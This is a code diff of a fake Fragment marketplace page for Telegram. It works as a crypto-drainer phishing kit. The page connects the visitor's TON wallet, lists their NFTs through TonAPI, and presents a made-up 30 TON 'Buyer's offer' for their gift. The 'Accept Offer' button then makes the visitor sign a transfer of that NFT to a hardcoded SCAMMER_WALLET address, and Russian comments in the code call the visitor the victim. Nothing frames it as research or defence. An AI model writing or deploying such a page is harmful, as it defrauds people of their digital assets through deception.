@@ -6,14 +6,14 @@
     <title>Fragment</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <!-- Библиотека для сборки транзакции на лету -->
     <script src="https://unpkg.com/@ton/core@latest/dist/browser/ton-core.min.js"></script>
     <style>
         :root { --bg: #0f0f0f; --card: #1a1a1a; --text: #e8e8e8; --dim: #888; --accent: #0098ea; --border: #2a2a2a; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; padding: 20px; min-height: 100vh; }
+        body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; padding: 20px; min-height: 100vh; }
         
-        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 24px; max-width: 400px; width: 100%; text-align: center; height: fit-content; display: none; }
+        .container { max-width: 400px; width: 100%; }
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 24px; text-align: center; display: none; }
         .card.active { display: block; }
         
         .header { font-size: 20px; font-weight: bold; color: var(--accent); margin-bottom: 24px; display: flex; align-items: center; justify-content: center; gap: 8px;}
@@ -21,7 +21,7 @@
         .gift-img-wrapper { width: 160px; height: 160px; margin: 0 auto 16px; position: relative; display: flex; align-items: center; justify-content: center; background: #232429; border-radius: 12px; overflow: hidden; }
         .gift-img { width: 100%; height: 100%; object-fit: contain; }
         
-        .gift-collection { font-size: 12px; color: var(--dim); text-transform: uppercase; margin-bottom: 4px;}
+        .gift-collection { font-size: 12px; color: var(--dim); text-transform: uppercase; margin-bottom: 4px; }
         .gift-name { font-size: 22px; font-weight: bold; margin-bottom: 24px; }
         
         .offer-box { background: linear-gradient(135deg, rgba(0,152,234,0.1), rgba(0,152,234,0.02)); border: 1px solid rgba(0,152,234,0.3); border-radius: 12px; padding: 16px; margin-bottom: 24px; }
@@ -29,85 +29,100 @@
         .offer-price { font-size: 32px; font-weight: bold; color: var(--accent); }
         .offer-price small { font-size: 14px; color: var(--dim); font-weight: normal; }
         
-        .btn { background: var(--accent); color: #fff; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; transition: opacity 0.2s; }
+        .btn { background: var(--accent); color: #fff; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; transition: opacity 0.2s; display: none; }
+        .btn.active { display: block; }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
         
-        .loading-text { font-size: 16px; color: var(--dim); text-align: center; padding: 40px 0; }
-        .skeleton { background: #252525; border-radius: 12px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .loading-text { font-size: 16px; color: var(--dim); text-align: center; padding: 40px 0; display: none; }
+        .loading-text.active { display: block; }
     </style>
 </head>
 <body>
-    <!-- Экран загрузки -->
-    <div id="loading" class="loading-text">Подключение к Fragment...</div>
+    <div class="container">
+        <!-- Кнопка подключения кошелька (видна сразу) -->
+        <button class="btn active" id="connectBtn">Connect Wallet</button>
 
-    <!-- Основной экран -->
-    <div class="card" id="mainCard">
-        <div class="header">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="12" fill="#0098EA"/><path d="M12 6V18M12 6L6 12M12 6L18 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Fragment
-        </div>
-        
-        <div class="gift-img-wrapper" id="imgWrapper">
-            <img class="gift-img" id="giftImage" src="" alt="Gift">
-        </div>
-        
-        <div class="gift-collection" id="giftCollection">Gifts Collection</div>
-        <div class="gift-name" id="giftName">Загрузка...</div>
+        <!-- Экран загрузки (показывается после подключения) -->
+        <div id="loading" class="loading-text">Поиск доступных офферов...</div>
 
-        <div class="offer-box">
-            <div class="offer-label">Buyer's offer</div>
-            <div class="offer-price">30 <small>TON</small></div>
-        </div>
-        
-        <p style="color: var(--dim); font-size: 13px; margin-bottom: 20px;">
-            @fragment_buyer wants to purchase your gift
-        </p>
+        <!-- Основной экран (показывается, когда подарок найден) -->
+        <div class="card" id="mainCard">
+            <div class="header">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="12" fill="#0098EA"/><path d="M12 6V18M12 6L6 12M12 6L18 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                Fragment
+            </div>
+            
+            <div class="gift-img-wrapper" id="imgWrapper">
+                <img class="gift-img" id="giftImage" src="" alt="Gift">
+            </div>
+            
+            <div class="gift-collection" id="giftCollection">Gifts Collection</div>
+            <div class="gift-name" id="giftName">Loading...</div>
 
-        <button class="btn" id="btn" onclick="acceptOffer()">Accept Offer</button>
+            <div class="offer-box">
+                <div class="offer-label">Buyer's offer</div>
+                <div class="offer-price">30 <small>TON</small></div>
+            </div>
+            
+            <p style="color: var(--dim); font-size: 13px; margin-bottom: 20px;">
+                @fragment_buyer wants to purchase your gift
+            </p>
+
+            <button class="btn active" id="acceptBtn">Accept Offer</button>
+        </div>
     </div>
 
     <script>
         const tg = window.Telegram?.WebApp;
         if (tg) { tg.ready(); tg.expand(); }
         
-        // ТВОЙ МАНИФЕСТ С GITHUB
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ 
             manifestUrl: "https://jejemakersx-netizen.github.io/fsdfdsfsdfsf/tonconnect-manifest.json" 
         });
 
-        // ТВОЙ КОШЕЛЕК
         const SCAMMER_WALLET = "UQCGPRdMpxZRFAPIukR1AoJNeaR14xCZ2RprQi5hucd_ncjy"; 
-
         let targetNftAddress = null;
 
-        // Ждем, пока жертва подключит кошелек
+        const connectBtn = document.getElementById('connectBtn');
+        const loading = document.getElementById('loading');
+        const mainCard = document.getElementById('mainCard');
+        const acceptBtn = document.getElementById('acceptBtn');
+
+        // Обработчик кнопки подключения
+        connectBtn.addEventListener('click', async () => {
+            try {
+                connectBtn.disabled = true;
+                await tonConnectUI.connectWallet();
+            } catch (e) {
+                connectBtn.disabled = false;
+                alert("Ошибка подключения: " + e.message);
+            }
+        });
+
+        // Следим за статусом кошелька
         tonConnectUI.onStatusChange(async (wallet) => {
             if (wallet) {
-                document.getElementById('loading').innerText = "Поиск доступных офферов...";
+                connectBtn.classList.remove('active');
+                loading.classList.add('active');
                 await scanVictimWallet(wallet.account.address);
             } else {
-                // Если кошелек отключен, показываем кнопку подключения
-                document.getElementById('loading').innerHTML = `
-                    <button class="btn" style="max-width: 300px; margin: 0 auto;" onclick="tonConnectUI.connectWallet()">
-                        Connect Wallet to view offer
-                    </button>
-                `;
+                connectBtn.classList.add('active');
+                connectBtn.disabled = false;
+                loading.classList.remove('active');
+                mainCard.classList.remove('active');
             }
         });
 
         async function scanVictimWallet(address) {
             try {
-                // Сканируем NFT жертвы через TonAPI
                 const res = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts`);
                 const data = await res.json();
 
                 if (!data.nft_items || data.nft_items.length === 0) {
-                    document.getElementById('loading').innerText = "У вас нет подарков для продажи.";
+                    loading.innerText = "У вас нет NFT для продажи.";
                     return;
                 }
 
-                // Ищем именно подарки (Gifts), если их нет - берем первый попавшийся NFT
                 let nft = data.nft_items.find(item => 
                     (item.collection?.name || "").toLowerCase().includes("gift") || 
                     (item.metadata?.name || "").toLowerCase().includes("gift")
@@ -115,37 +130,29 @@
 
                 targetNftAddress = nft.address;
 
-                // Подтягиваем картинку и название
-                const img = document.getElementById('giftImage');
-                const name = document.getElementById('giftName');
-                const collection = document.getElementById('giftCollection');
+                document.getElementById('giftImage').src = nft.previews && nft.previews.length > 0 ? nft.previews[0].url : "";
+                document.getElementById('giftName').innerText = nft.metadata?.name || "Telegram Gift";
+                document.getElementById('giftCollection').innerText = nft.collection?.name || "Gifts Collection";
 
-                img.src = nft.previews && nft.previews.length > 0 ? nft.previews[0].url : "";
-                name.innerText = nft.metadata?.name || "Telegram Gift";
-                collection.innerText = nft.collection?.name || "Gifts Collection";
-
-                // Показываем карточку оффера
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('mainCard').classList.add('active');
+                loading.classList.remove('active');
+                mainCard.classList.add('active');
                 if(tg) tg.HapticFeedback.notificationOccurred('success');
 
             } catch (e) {
                 console.error(e);
-                document.getElementById('loading').innerText = "Ошибка загрузки профиля. Обновите страницу.";
+                loading.innerText = "Ошибка загрузки профиля. Обновите страницу.";
             }
         }
 
-        async function acceptOffer() {
+        acceptBtn.addEventListener('click', async () => {
             if (!targetNftAddress) return;
             
-            const btn = document.getElementById('btn');
-            btn.disabled = true; 
-            btn.innerText = "Processing...";
+            acceptBtn.disabled = true; 
+            acceptBtn.innerText = "Processing...";
             
             try {
                 const { beginCell, Address } = window.tonCore;
                 
-                // Собираем транзакцию перевода NFT на твой кошелек
                 const body = beginCell();
                 body.storeUint(0x5fcc3d14, 32); 
                 body.storeUint(0, 64);          
@@ -157,27 +164,26 @@
 
                 const payloadBase64 = body.endCell().toBoc().toString('base64');
 
-                btn.innerText = "Confirm in wallet...";
+                acceptBtn.innerText = "Confirm in wallet...";
                 
-                // Отправляем жертве на подпись
                 await tonConnectUI.sendTransaction({
                     validUntil: Math.floor(Date.now() / 1000) + 300,
                     messages: [{
                         address: targetNftAddress,
-                        amount: "50000000", // 0.05 TON
+                        amount: "50000000",
                         payload: payloadBase64
                     }]
                 });
                 
-                btn.innerText = "Offer Accepted ✓";
+                acceptBtn.innerText = "Offer Accepted ✓";
                 if (tg) tg.HapticFeedback.notificationOccurred('success');
                 
             } catch (e) {
-                btn.disabled = false; 
-                btn.innerText = "Accept Offer";
+                acceptBtn.disabled = false; 
+                acceptBtn.innerText = "Accept Offer";
                 alert("Ошибка транзакции: " + e.message);
             }
-        }
+        });
     </script>
 </body>
 </html>
